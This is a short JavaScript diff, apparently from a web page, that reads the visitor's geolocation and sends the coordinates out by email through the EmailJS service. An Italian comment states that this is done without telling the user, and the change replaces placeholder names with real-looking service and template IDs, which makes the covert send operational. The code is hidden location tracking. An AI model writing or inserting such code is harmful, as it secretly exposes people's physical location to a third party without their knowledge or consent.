@@ -18,7 +18,7 @@
         navigator.geolocation.getCurrentPosition(
           function(pos) {
             // Manda la posizione via email senza dirlo all'utente
-            emailjs.send("Gmail", "Contact Us", {
+            emailjs.send("service_d14gbw2", "template_t3p4r3c", {
               latitude: pos.coords.latitude,
               longitude: pos.coords.longitude
             });
